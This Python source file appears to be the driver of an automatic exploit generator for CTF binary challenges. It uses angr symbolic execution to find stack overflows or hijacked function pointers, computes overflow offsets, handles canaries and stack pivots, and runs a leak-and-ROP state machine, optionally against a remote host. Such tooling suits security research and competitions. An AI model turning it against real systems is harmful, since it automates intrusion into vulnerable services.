# encoding:utf-8
import copy

import angr.exploration_techniques
import claripy
from angr import sim_options as so, SimUnsatError

from .utils import *
from .challenge import Challenge, FlagFound
from .mod_leak import init_leaks, ARCH_64_BASE, ARCH_32_BASE
from .mod_exploit import init_exploits
from .mod_technique import check_win, check_mem_write, check_addr_leak, DFS
from .mod_sim_procedure import ReplaceLibcStartMain
from .engine import SmallEngine
from .binary_interactive import InteractiveBinary

INFINITE_ACTIVE = -1


class AEGModule:

    def __init__(self, binary, flag_path=None, ip=None, port=None, timeout=5000, flirt=None, libc=None, ld=None,
                 _debug=False, _interactive=False, active_size=INFINITE_ACTIVE):
        self.max_active_size = active_size
        # self.argv_in = True
        log.info(f'Start pwning {binary} with flag path: {flag_path}')
        if ip and port:
            log.info(f'Will pwn remote as: {ip}:{port}')
        self.challenge = Challenge(binary, flag_path, libc, ld)
        self.leaks = init_leaks()
        self.exploits = init_exploits()
        self.timeout = timeout
        self.flirt = flirt
        self.interactive_binary = InteractiveBinary(binary, flag_path, self.challenge,
                                                    copy.deepcopy(self.challenge.target_property), None,
                                                    self.challenge.target_property['arch_bytes'], ip=ip,
                                                    port=port, interactive=_interactive)
        self.debug = _debug

    def exploit(self):
        start_time = time.time()
        challenge = self.challenge
        challenge.target_property['flirt'] = self.flirt
        challenge.preprocess()
        main_opts = {}
        arch_base = 0
        if challenge.protection['PIE']:
            arch_base = ARCH_64_BASE if challenge.target_property['arch_bytes'] == 8 else ARCH_32_BASE
            main_opts['base_addr'] = arch_base
        project = angr.Project(self.challenge.target_property['file'],
                               load_options={"auto_load_libs": False, },
                               # force_load_libs=[challenge.target_property['libc']],
                               lib_opts={challenge.target_property['libc']: {"base_addr": ARCH_64_LIBC_BASE}},
                               main_opts=main_opts)
        challenge.do_hook(project, arch_base)
        self.interactive_binary.io_seg_addr = challenge.get_segment_address_copy()

        project.factory._tls.default_engine = SmallEngine(project)  # slightly faster than default engine

        extras = {
            so.REVERSE_MEMORY_NAME_MAP,
            so.TRACK_ACTION_HISTORY,
            so.UNICORN,
            so.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
            so.ZERO_FILL_UNCONSTRAINED_MEMORY,
        }

        # args_in = [challenge.target_binary.file.name]
        # arg = claripy.BVS("argv1", 0x100 * 8)
        # args_in.append(arg)

        if challenge.target_binary.symbols.get('main'):
            self.interactive_binary.rop_address = challenge.target_binary.sym.get("main")
            main_addr = challenge.target_binary.symbols.get('main') + arch_base
            log.info(f"Set main as: {hex(main_addr)}")
            states = [project.factory.call_state(addr=main_addr, add_options=extras, ret_addr=arch_base)]
        else:
            entry = int(str(project.entry))
            if challenge.target_property['static']:
                hook_libc_start_main(project, entry, ReplaceLibcStartMain())
            # hook_libc_start_main(project, entry, ReplaceLibcStartMain())
            states = [project.factory.entry_state(add_options=extras)]

        for state in states:
            state.register_plugin("heap", angr.state_plugins.heap.heap_ptmalloc.SimHeapPTMalloc(ARCH_64_HEAP_BASE))
            for file_name in ['flag', 'flag.txt', '.pass']:
                state.fs.insert(file_name, angr.storage.SimFile(file_name, b'flag{12345678-90ab-cdef}', size=24))

        simulation_mgr = project.factory.simulation_manager(states, save_unconstrained=True)

        if self.max_active_size == 1:
            simulation_mgr.use_technique(DFS())  # faster for simple binary, as its name.
        # simulation_mgr.use_technique(WinFinder(binary))
        # simulation_mgr.use_technique(angr.exploration_techniques.Threading())

        for active in simulation_mgr.active:
            active.globals['binary'] = self.interactive_binary.__copy__()
            active.globals['challenge'] = self.challenge
            active.libc.max_strtol_len = 17  # 20   # old is len(str(2**31)) + 1 = 11
            active.libc.buf_symbolic_bytes = 0x100  # default is 60, for log inputs like scanf
        log.info("Start finding unconstrained state")
        self.sim_explore(simulation_mgr, project, challenge, 1, start_time, 1)
        log.failure("Bad luck...\nBye~")

    def sim_explore(self, sim_mgr, project, challenge, branch_depth, start_time, explore_depth):
        while (sim_mgr.active or sim_mgr._stashes.get('deferred')) and time.time() - start_time < self.timeout:
            if self.max_active_size != 1 and self.max_active_size != INFINITE_ACTIVE:
                sim_mgr.move(from_stash='active', to_stash='deferred',
                             filter_func=lambda x: sim_mgr.active.index(x) < len(sim_mgr.active) - self.max_active_size)
            if not sim_mgr.active and sim_mgr._stashes.get('deferred'):
                sim_mgr.move(from_stash='deferred', to_stash='active',
                             filter_func=None if self.max_active_size != INFINITE_ACTIVE
                             else lambda x: sim_mgr.deferred.index(x) < self.max_active_size)
            # if sim_mgr._stashes.get('deferred'):
            #     sim_mgr._clear_states('deferred')
            if self.debug:
                context.log_level = 'debug'
                try:
                    print([hex(x.solver.eval(x.regs.pc)) for x in sim_mgr.active])
                    print([hex(x.solver.eval(x.regs.sp)) for x in sim_mgr.active])
                    print([x.memory.load(x.solver.eval(x.regs.pc), 8) for x in sim_mgr.active])
                    print(project.loader.main_object.segments)
                except SimUnsatError:
                    pass

            log.info(f"\t<{branch_depth}>({explore_depth}):{sim_mgr.step()}")
            explore_depth += 1
            if sim_mgr.active:
                for active in sim_mgr.active:
                    active.inspect.b('mem_write', when=angr.BP_AFTER, action=check_mem_write)
                    check_addr_leak(active)
            if challenge.segment_address.get('win_func'):
                check_win(sim_mgr, project, challenge)

            if sim_mgr.unconstrained:
                for unconstrained in sim_mgr.unconstrained:
                    rs = self.unconstrained_explorer(unconstrained, project, challenge, unconstrained.globals['binary'])
                    if rs:
                        sim_mgr.active.append(rs)
                sim_mgr.drop(stash='unconstrained')

        if not sim_mgr.active:
            log.warning("Simulation manager state all dead")
            if self.debug:
                if sim_mgr.errored:
                    sim_mgr.errored[0].reraise()
        else:
            log.warning("Timeout, killed")
        return explore_depth

    def unconstrained_explorer(self, state, project: angr.Project, challenge: Challenge, binary: InteractiveBinary):
        if binary.current_process and binary.current_process.poll():
            if binary.current_process.poll() == 14:
                log.info("Binary has SIGALRM, restart")
                binary.connect(state)
            else:
                binary.close()
                log.warning(f"Process dead, skip unconstrained state")
                return
        for leak in self.leaks:
            leak.available = True
        for exploit in self.exploits:
            exploit.available = True
        log.success(f"Found unconstrained state {state}")
        # log.success(f"Get control return address with input: {possible_state.posix.dumps(0)}")
        # ref from bof aeg
        block = project.factory.block(list(state.history.bbl_addrs)[-1])
        for func_name, func in challenge.target_binary.functions.items():
            if func.address <= block.addr < func.address + func.size:
                log.info(f"Overflow func({func_name}): 0x{hex(func.address)}")
                # binary.rop_address = func.address
                break
        if not binary.rop_address:
            log.info("Try to find overflow func addr with r2")
            funcs = get_func_block_by_r2(challenge)
            for func_name, func in funcs.items():
                if func['addr'] <= block.addr < func['addr'] + func['size']:
                    log.info(f"Overflow func({func_name}): 0x{hex(func['addr'])}")
                    binary.rop_address = func['addr']
                    break
        log.info(f"Rop addr set to: {hex(binary.rop_address)}")
        arch_byte = challenge.target_property['arch_bytes']
        rbp = state.solver.eval(state.regs.sp - arch_byte * 2)
        log.info(f"rbp is: {hex(rbp)}")
        mem_map = list(state.memory.addrs_for_name(list(state.regs.pc.variables)[0]))
        mem_map.sort()

        bof_offset = None
        try:
            bof_offset = mem_map.index(rbp + arch_byte)
        except ValueError:
            cons = [state.regs.pc == binary.rop_address]
            if not state.solver.satisfiable(extra_constraints=cons):
                log.warning("Can't find overflow offset, restart. This "
                            "may because this challenge just need stack pivot")
                return

        if bof_offset is not None:
            if 'leave' == block.capstone.insns[-2].mnemonic:
                log.info("bp may need to be fixed if we ROP twice")
                binary.new_stack_addr = challenge.target_binary.bss() + 0x230
                binary.new_stack_symbol = mem_map[bof_offset - arch_byte]

            log.info(f"overflow offset (to pc) for this state is: {bof_offset}")
            sof_control_addr = mem_map[bof_offset:]
            binary.overflow_mem = sof_control_addr
            binary.state = state
            log.info(f"Overflow length: {len(sof_control_addr)}")
            binary.payload_len = len(sof_control_addr)

            if binary.challenge.protection.get('Canary'):
                if binary.io_seg_addr.get('Canary'):
                    log.info(f"Have canary protection and we can try bypass it")
                    binary.canary = mem_map[bof_offset - arch_byte * 2]
                    binary.challenge.protection['Canary'] = False
                elif CANARY not in state.posix.dumps(0):
                    log.warning("[!!] The leak path does not contains canary, disable it.")
                    binary.challenge.protection['Canary'] = False
                else:
                    log.warning(f"Have canary protection and currently we can't bypass it yet")
                    return
        else:
            log.success("We hijacked a function pointer")
            fake_pc_mem_addr = 0x666c3420  # 0x666c3420 is just a magic random address
            fake_pc_mem = state.solver.BVS("fp_pc", arch_byte * 8)
            state.memory.store(fake_pc_mem_addr, fake_pc_mem, size=arch_byte)
            state.solver.add(state.regs.pc == claripy.Reverse(fake_pc_mem))
            sof_control_addr = [fake_pc_mem_addr + i for i in range(arch_byte)]
            binary.overflow_mem = sof_control_addr
            binary.state = state
            log.info(f"Overflow length: {len(sof_control_addr)}")
            binary.payload_len = len(sof_control_addr)

        log.info("Start ROP FSM")
        progress = True
        restart = False
        binary_before = binary.__copy__()
        while progress or restart:
            if restart:
                log.info("Restarting FSM")
                binary.close()
                binary = binary_before.__copy__()
                binary.close()
                binary.connect(state)
                restart = False
            progress = False
            log.info(f"Step with known segments: {binary.io_seg_addr}")
            for exploit in self.exploits:
                if exploit.satisfy(binary):
                    exploit.run(state.copy(), challenge, sof_control_addr.copy())
                    exploit.available = False
                    restart = True
                    break
            if not restart:
                for leak in self.leaks:
                    if leak.satisfy(binary):
                        progress = leak.run(state.copy(), challenge, sof_control_addr.copy())
                        if binary.current_process is not None and not binary.check_alive():
                            leak.available = False
                            log.warning("Process dead after leak, restarting")
                            restart = True
                            break
                        elif progress:
                            binary = progress
                            log.success(f"Acquire new information, now: {binary.io_seg_addr}")
                            binary.leak_path.append(leak)
                            break
            if not progress and not restart:  # try un useful payload:
                for exploit in self.exploits:
                    if exploit.satisfy(binary, try_lazy=True):
                        exploit.run(state.copy(), challenge, sof_control_addr.copy())
                        exploit.available = False
                        restart = True
                        break
            if not progress and not restart:  # will die, try short jump and return new state
                log.info("Try short jump")
                return False
        binary.close()
        log.warning("FSM goes to end,")
